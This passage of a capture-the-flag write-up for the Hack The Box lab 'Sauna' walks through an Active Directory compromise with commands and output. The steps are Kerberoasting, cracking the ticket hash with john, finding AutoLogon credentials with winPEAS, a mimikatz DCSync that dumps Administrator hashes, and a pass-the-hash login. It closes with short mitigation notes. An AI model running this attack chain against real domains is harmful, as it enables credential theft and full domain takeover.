ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 00:54:34.140321  <never>               



[-] SPN: SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111 - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
root@kali:/home/kali/htb/Sauna#
```

I know it has something to do with my date compared to the server and I find the [hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast) entry for kerberoasting and use ntpdate:

```
root@kali:/home/kali/htb/Sauna# ntpdate 10.129.1.165; GetUserSPNs.py egotistical-bank.local/FSmith:Thestrokes23 -dc-ip 10.129.1.165 -request -output hash2
17 Mar 01:15:53 ntpdate[7266]: step time server 10.129.1.165 offset +25253.624061 sec
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 00:54:34.140321  <never>               



root@kali:/home/kali/htb/Sauna# cat hash2
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$SAUNA/HSmith.EGOTISTICALBANK.LOCAL~60111*$afd9b66eef23ce9bd1de99ac97fe3317$9796e385146b6cd72b295e4c34cd9d7a41e24b5e2e737538e3c5a7712d934a2b18a9554ee60acb8ce9e1905ec6645c46f34eeb7afd5373748513e8970ac687d4b4ec27b5ef7bdc00995b6496ecdf0094727324efc8595b6dd69b91a74e272e1148093786b7b4cff3e6e28ef4a192f1587f9d3fdd1061b9cd4b67bcdc95b2b692cf186bd9f73d8fa145ebbb106d97beb660fe8bc5f899f435f7afb2b6a100ac157630b6a7e10216bf47f1e39a5b3905d03bf119dd10877707545da958fdf76cd8178f7d6f22043344e15edbc171bafa41cea588a628cfce7ab9bf3a31dba59813ed8637de1395e33dc3119c0fb858cd36e0096d5f2451ffc25eb58194cb59991b61134856ec94ae7148c9c7e0bb9c82d9fd33c916657788fb1722cd2ca753cc4cf22733b6a96f901477f741642f167378e16fb769a58b5b28fe9a4734fa1b6e0e96c982dc9a931642a708caef54dd06cab371132efab0fc583741ed254724b905a5dab97b4b4baddc7811dac0a5fe2b1ac8ef4bc2e781d514e52fab2dcdaedb329a954d848827a0ca6ddacaadadd67b662f1be06cb0bb5442adce614e5ea2517df3842edcd4f41815715ec330f2c1bd58893453484e9520e000fb00b6f3544da8e6a34b6fdbd9361107fd56dbaf47b2a6d5895a65409a390daf516e376faee18b081494c339dbd646d9bddc7f7cf7ac705f9899a000e72c0d98c1199f1c6a0c85aa683f1b11560a0bcb5f57583a9e5fb6b179b59e4ba3dd02f1b3d441775921c0537b194432e49d93dcb6469801c6f068cce0da1101568f5719d3cba61bf54256ef5a7106b5e4f66da4ae9a5c24d02f6cb0fbe0dfae3ae6805d89b6072f18f24a661f308b006e5d9dd4eca38266ff81ab887b40fb841ed47ee5608bb97ca0d906dbb9a642b0dd90ffbe1d3f5e77080c7381168f63eb13d1fe77963d4ea6fcc4d54de2c46aa5f4b3445056f56d063ac8d31e7f7567c681e4b335a5d0063da076ba013764f1d7e7638de0baed0e62865e7014b8a3b716b17e19bbb188be077c5fa3131bd8d9209f81c8210c175e3203418e47f6e63872409ee6be72b54a93ef67c75a393c801c126e5b796ded41ea92592cdb1d9789c39647f5981e4d4b033652f961fe6f1a529f1efc73c4d60cf0757263b0659ab7859b48a33029ec791130b0c9014208d4509bcf71530961ad2865f072bb6784a0fff1ef0d5d58d9c101130f9bc0f6d914df550aea2680324c25ca4cd0870b15c81ae774a3f80addcd7eeb00a32753513c9b9a2a2ea4d3273783390a37bcb191929f8fad09d6edc3e8f61997e6a51eaf389172558bc752f69fe9d6df3565da68d36b70ffc816bd90e6336cfaad035784c3702b6d04fc65dd4333cc5eeb97e31bacaed0dccff197f4064c8fd60ca061d15e7c
root@kali:/home/kali/htb/Sauna# john hash2 -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     (?)
1g 0:00:00:05 DONE (2021-03-16 18:17) 0.1841g/s 1940Kp/s 1940Kc/s 1940KC/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:/home/kali/htb/Sauna# 
```

So HSmith and FSmith use the same password. I cannot login with HSmith however, so I'm not quite sure what's going on there.

I decide to enumerate with my evil-winrm process for a bit, so I upload winPEAS.

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload /home/kali/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/obj/x64/Release/winPEAS.exe
Info: Uploading /home/kali/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/obj/x64/Release/winPEAS.exe to C:\Users\FSmith\Documents\winPEAS.exe                                                     

                                                             
Data: 629416 bytes of 629416 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\FSmith\Documents> dir


    Directory: C:\Users\FSmith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/16/2021  10:24 PM         472064 winPEAS.exe


*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEAS.exe

``` 

It finds something good:

```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```

seems like we have the creds of a service account.

I relog on evil-winrm, as well as check smbmap for new access.

I also check bloodhound to see what this user can do. And it has both GetChanges and GetChangesAll privileges. So I was hesitant to use it earlier, because it was on two separate groups. It may still be possible, but I don't know. This time I know it should work.

To revisit, we need to run mimikatz.exe with these options: `lsadump::dcsync /domain:testlab.local /user:Administrator`

```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>./mimikatz.exe "lsadump::dcsync /user:Administrator" > mimi.txt
```

It was stuck in a loop, so I had to write it to a file, cancel the process and then download the file.

I deleted the loop contents:

```
root@kali:/home/kali/htb/Sauna# cat mimi.txt
��
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : caab2b641b39e342e0bdfcd150b1683e

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       (4096) : 19d5f15d689b1ce5
    OldCredentials
      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       (4096) : d9379d13f7c15d1c

* Primary:Kerberos *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : 19d5f15d689b1ce5
    OldCredentials
      des_cbc_md5       : d9379d13f7c15d1c

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  3fbea1ff422da035f1dc9b0ce45e84ea
    02  708091daa9db25abbd1d94246e4257e2
    03  417f2e40d5be8d436af749ed9fddb0b0
    04  3fbea1ff422da035f1dc9b0ce45e84ea
    05  50cb7cfb64edf83218804d934e30d431
    06  781dbcf7b8f9079382a1948f26f561ee
    07  4052111530264023a7d445957f5146e6
    08  8f4bffc5d94cc294272cd0c836e15c47
    09  0c81bc892ea87f7dd0f4a3a05b51f158
    10  f8c10a5bd37ea2568976d47ef12e55b9
    11  8f4bffc5d94cc294272cd0c836e15c47
    12  023b04503e3eef421de2fcaf8ba1297d
    13  613839caf0cf709da25991e2e5cb63cf
    14  16974c015c9905fb27e55a52dc14dfb0
    15  3c8af7ccd5e9bd131849990d6f18954b
    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
    17  6eeda5f64e4adef4c299717eafbd2850
    18  3b32ec94978feeac76ba92b312114e2c
    19  b25058bc1ebfcac10605d39f65bff67f
    20  89e75cc6957728117eb1192e739e5235
    21  7e6d891c956f186006f07f15719a8a4e
    22  a2cada693715ecc5725a235d3439e6a2
    23  79e1db34d98ccd050b493138a3591683
    24  1f29ace4f232ebce1a60a48a45593205
    25  9233c8df5a28ee96900cc8b59a731923
    26  08c02557056f293aab47eccf1186c100
    27  695caa49e68da1ae78c1523b3442e230
    28  57d7b68bd2f06eae3ba10ca342e62a78
    29  3f14bb208435674e6a1cb8a957478c18

root@kali:/home/kali/htb/Sauna#  
```

Then I simply pass-the-hash with Evil-Winrm to get root:

```
root@kali:/home/kali/htb/Sauna# evil-winrm -i 10.129.1.165 -u 'Administrator' -H d9485863c1e9e05851aa40cbb4ab9dff

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

So much enumeration here. But I got more familiar with loads of tools. 


## Comparing myself with the official writeup:

They start by enumerating LDAP with windapsearch, and find that anonymous binds are allowed, but it does not do anything. The same with GetADUsers.

They find the employee names, and use Username Anarchy to generate username permutations.

They then use GetNPUsers.py to get the TGS tickets of FSmith.

They log in with Evil-Winrm, and upload winPEAS. 

They find the service account creds and run bloodhound to find the dcsync attack.

They use secretsdump.py to get the administrator hash, and psexec to get root.


## How to stop this exploit:

I honestly think there's only two large issues here. The first is the kerberoastable account. I talk more about kerberoasting and how to mitigate it in [active](https://github.com/matale14/Writeups/blob/main/HTB/Active/Active.MD)

The second is running the service account automatically with the password being accessible.

